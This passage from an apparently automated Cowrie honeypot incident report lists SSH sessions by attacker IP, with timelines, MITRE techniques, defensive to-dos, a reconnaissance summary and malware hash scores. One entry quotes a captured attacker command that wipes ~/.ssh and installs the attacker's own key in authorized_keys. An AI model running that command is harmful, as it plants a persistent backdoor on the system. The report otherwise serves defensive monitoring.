| `2026-08-08 07:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]23` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5878d51ea8

| Field | Detail |
|---|---|
| **Source IP** | `104.152.58[.]233` |
| **First Seen** | 2026-08-08 07:53 |
| **Last Seen** | 2026-08-08 07:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:53:04` | `cowrie.session.connect` |
| `2026-08-08 07:53:05` | `cowrie.client.version` |
| `2026-08-08 07:53:05` | `cowrie.client.kex` |
| `2026-08-08 07:53:06` | `cowrie.login.success` |
| `2026-08-08 07:53:06` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.152.58[.]233` to AbuseIPDB if not already reported
- [ ] Block `104.152.58[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c38a53b05ab

| Field | Detail |
|---|---|
| **Source IP** | `125.72.150[.]250` |
| **First Seen** | 2026-08-08 07:53 |
| **Last Seen** | 2026-08-08 07:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:53:12` | `cowrie.session.connect` |
| `2026-08-08 07:53:14` | `cowrie.client.version` |
| `2026-08-08 07:53:14` | `cowrie.client.kex` |
| `2026-08-08 07:53:16` | `cowrie.login.success` |
| `2026-08-08 07:53:17` | `cowrie.direct-tcpip.request` |
| `2026-08-08 07:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.72.150[.]250` to AbuseIPDB if not already reported
- [ ] Block `125.72.150[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7cd67a3a23d

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-08 08:06 |
| **Last Seen** | 2026-08-08 08:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:06:49` | `cowrie.session.connect` |
| `2026-08-08 08:06:50` | `cowrie.client.version` |
| `2026-08-08 08:06:50` | `cowrie.client.kex` |
| `2026-08-08 08:06:51` | `cowrie.login.success` |
| `2026-08-08 08:06:51` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83031746090

| Field | Detail |
|---|---|
| **Source IP** | `103.203.210[.]119` |
| **First Seen** | 2026-08-08 08:06 |
| **Last Seen** | 2026-08-08 08:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:06:57` | `cowrie.session.connect` |
| `2026-08-08 08:06:57` | `cowrie.client.version` |
| `2026-08-08 08:06:57` | `cowrie.client.kex` |
| `2026-08-08 08:06:59` | `cowrie.login.success` |
| `2026-08-08 08:07:00` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.203.210[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.203.210[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4038e6ffa3

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-08-08 08:18 |
| **Last Seen** | 2026-08-08 08:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:18:24` | `cowrie.session.connect` |
| `2026-08-08 08:18:25` | `cowrie.client.version` |
| `2026-08-08 08:18:25` | `cowrie.client.kex` |
| `2026-08-08 08:18:27` | `cowrie.login.success` |
| `2026-08-08 08:18:27` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d5603ff618

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-08-08 08:18 |
| **Last Seen** | 2026-08-08 08:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:18:33` | `cowrie.session.connect` |
| `2026-08-08 08:18:35` | `cowrie.client.version` |
| `2026-08-08 08:18:35` | `cowrie.client.kex` |
| `2026-08-08 08:18:37` | `cowrie.login.success` |
| `2026-08-08 08:18:39` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03547b820c18

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-08 08:22 |
| **Last Seen** | 2026-08-08 08:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:22:35` | `cowrie.session.connect` |
| `2026-08-08 08:22:36` | `cowrie.client.version` |
| `2026-08-08 08:22:36` | `cowrie.client.kex` |
| `2026-08-08 08:22:38` | `cowrie.login.success` |
| `2026-08-08 08:22:38` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-968e825f103d

| Field | Detail |
|---|---|
| **Source IP** | `91.219.196[.]17` |
| **First Seen** | 2026-08-08 08:26 |
| **Last Seen** | 2026-08-08 08:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:26:14` | `cowrie.session.connect` |
| `2026-08-08 08:26:14` | `cowrie.client.version` |
| `2026-08-08 08:26:14` | `cowrie.client.kex` |
| `2026-08-08 08:26:15` | `cowrie.login.success` |
| `2026-08-08 08:26:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.219.196[.]17` to AbuseIPDB if not already reported
- [ ] Block `91.219.196[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52e62485d9c

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-08 08:26 |
| **Last Seen** | 2026-08-08 08:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:26:44` | `cowrie.session.connect` |
| `2026-08-08 08:26:45` | `cowrie.client.version` |
| `2026-08-08 08:26:45` | `cowrie.client.kex` |
| `2026-08-08 08:26:45` | `cowrie.login.success` |
| `2026-08-08 08:26:46` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600f8d23c146

| Field | Detail |
|---|---|
| **Source IP** | `155.212.17[.]174` |
| **First Seen** | 2026-08-08 08:26 |
| **Last Seen** | 2026-08-08 08:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:26:51` | `cowrie.session.connect` |
| `2026-08-08 08:26:51` | `cowrie.client.version` |
| `2026-08-08 08:26:51` | `cowrie.client.kex` |
| `2026-08-08 08:26:52` | `cowrie.login.success` |
| `2026-08-08 08:26:52` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.212.17[.]174` to AbuseIPDB if not already reported
- [ ] Block `155.212.17[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e82a002d8b1

| Field | Detail |
|---|---|
| **Source IP** | `197.251.193[.]6` |
| **First Seen** | 2026-08-08 08:30 |
| **Last Seen** | 2026-08-08 08:30 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:30:00` | `cowrie.session.connect` |
| `2026-08-08 08:30:03` | `cowrie.client.version` |
| `2026-08-08 08:30:03` | `cowrie.client.kex` |
| `2026-08-08 08:30:06` | `cowrie.login.success` |
| `2026-08-08 08:30:07` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.193[.]6` to AbuseIPDB if not already reported
- [ ] Block `197.251.193[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ba6ccc4b37b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 08:34 |
| **Last Seen** | 2026-08-08 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:34:35` | `cowrie.session.connect` |
| `2026-08-08 08:34:35` | `cowrie.client.version` |
| `2026-08-08 08:34:35` | `cowrie.client.kex` |
| `2026-08-08 08:34:36` | `cowrie.login.success` |
| `2026-08-08 08:34:36` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:34:36` | `cowrie.direct-tcpip.data` |
| `2026-08-08 08:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d231cb4a1da3

| Field | Detail |
|---|---|
| **Source IP** | `5.88.119[.]21` |
| **First Seen** | 2026-08-08 08:42 |
| **Last Seen** | 2026-08-08 08:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:42:25` | `cowrie.session.connect` |
| `2026-08-08 08:42:25` | `cowrie.client.version` |
| `2026-08-08 08:42:25` | `cowrie.client.kex` |
| `2026-08-08 08:42:26` | `cowrie.login.success` |
| `2026-08-08 08:42:26` | `cowrie.session.params` |
| `2026-08-08 08:42:26` | `cowrie.command.input` |
| `2026-08-08 08:42:26` | `cowrie.command.failed` |
| `2026-08-08 08:42:27` | `cowrie.log.closed` |
| `2026-08-08 08:42:27` | `cowrie.session.params` |
| `2026-08-08 08:42:27` | `cowrie.command.input` |
| `2026-08-08 08:42:28` | `cowrie.session.file_download` |
| `2026-08-08 08:42:28` | `cowrie.log.closed` |
| `2026-08-08 08:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.88.119[.]21` to AbuseIPDB if not already reported
- [ ] Block `5.88.119[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-706818f6b8f3

| Field | Detail |
|---|---|
| **Source IP** | `5.88.119[.]21` |
| **First Seen** | 2026-08-08 08:42 |
| **Last Seen** | 2026-08-08 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:42:28` | `cowrie.session.connect` |
| `2026-08-08 08:42:28` | `cowrie.client.version` |
| `2026-08-08 08:42:28` | `cowrie.client.kex` |
| `2026-08-08 08:42:28` | `cowrie.login.success` |
| `2026-08-08 08:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.88.119[.]21` to AbuseIPDB if not already reported
- [ ] Block `5.88.119[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d175a48a91ef

| Field | Detail |
|---|---|
| **Source IP** | `5.88.119[.]21` |
| **First Seen** | 2026-08-08 08:42 |
| **Last Seen** | 2026-08-08 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:42:29` | `cowrie.session.connect` |
| `2026-08-08 08:42:29` | `cowrie.client.version` |
| `2026-08-08 08:42:29` | `cowrie.client.kex` |
| `2026-08-08 08:42:29` | `cowrie.login.success` |
| `2026-08-08 08:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.88.119[.]21` to AbuseIPDB if not already reported
- [ ] Block `5.88.119[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d35727b6b87a

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-08-08 08:52 |
| **Last Seen** | 2026-08-08 08:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:52:56` | `cowrie.session.connect` |
| `2026-08-08 08:52:56` | `cowrie.client.version` |
| `2026-08-08 08:52:56` | `cowrie.client.kex` |
| `2026-08-08 08:52:57` | `cowrie.login.success` |
| `2026-08-08 08:52:58` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7bb21d0a2f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]223` |
| **First Seen** | 2026-08-08 08:52 |
| **Last Seen** | 2026-08-08 08:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:52:57` | `cowrie.session.connect` |
| `2026-08-08 08:52:58` | `cowrie.client.version` |
| `2026-08-08 08:52:58` | `cowrie.client.kex` |
| `2026-08-08 08:53:00` | `cowrie.login.success` |
| `2026-08-08 08:53:01` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]223` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad74bfe47343

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-08-08 08:53 |
| **Last Seen** | 2026-08-08 08:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 08:53:10` | `cowrie.session.connect` |
| `2026-08-08 08:53:11` | `cowrie.client.version` |
| `2026-08-08 08:53:11` | `cowrie.client.kex` |
| `2026-08-08 08:53:13` | `cowrie.login.success` |
| `2026-08-08 08:53:13` | `cowrie.direct-tcpip.request` |
| `2026-08-08 08:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **10** | 2026-08-08 07:09 | 2026-08-08 08:14 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-08 07:12 | 2026-08-08 08:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-08 07:48 | 2026-08-08 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-08 07:32 | 2026-08-08 07:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]106` | **3** | 2026-08-08 07:44 | 2026-08-08 07:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-08 08:37 | 2026-08-08 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | **2** | 2026-08-08 08:23 | 2026-08-08 08:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | **2** | 2026-08-08 07:15 | 2026-08-08 07:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]86` | **2** | 2026-08-08 08:46 | 2026-08-08 08:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]240` | 1 | 2026-08-08 08:28 | 2026-08-08 08:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-08 08:09 | 2026-08-08 08:10 | 49s | 0 | `T1592` | 🟢 LOW |
| `138.185.199[.]250` | 1 | 2026-08-08 07:11 | 2026-08-08 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.67.156[.]50` | 1 | 2026-08-08 07:23 | 2026-08-08 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.9[.]22` | 1 | 2026-08-08 07:44 | 2026-08-08 07:44 | 29s | 0 | `T1592` | 🟢 LOW |
| `194.44.57[.]164` | 1 | 2026-08-08 07:25 | 2026-08-08 07:26 | 14s | 0 | `T1592` | 🟢 LOW |
| `213.66.197[.]199` | 1 | 2026-08-08 06:58 | 2026-08-08 07:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.17.176[.]80` | 1 | 2026-08-08 07:34 | 2026-08-08 07:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.180.171[.]157` | 1 | 2026-08-08 07:17 | 2026-08-08 07:18 | 11s | 0 | `T1592` | 🟢 LOW |
| `36.70.237[.]96` | 1 | 2026-08-08 07:35 | 2026-08-08 07:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-08 07:37 | 2026-08-08 07:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-08 07:44 | 2026-08-08 07:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-08 08:35 | 2026-08-08 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]103` | 1 | 2026-08-08 07:57 | 2026-08-08 07:58 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-08 08:35 | 2026-08-08 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-08 08:38 | 2026-08-08 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-08-08 08:26 | 2026-08-08 08:28 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
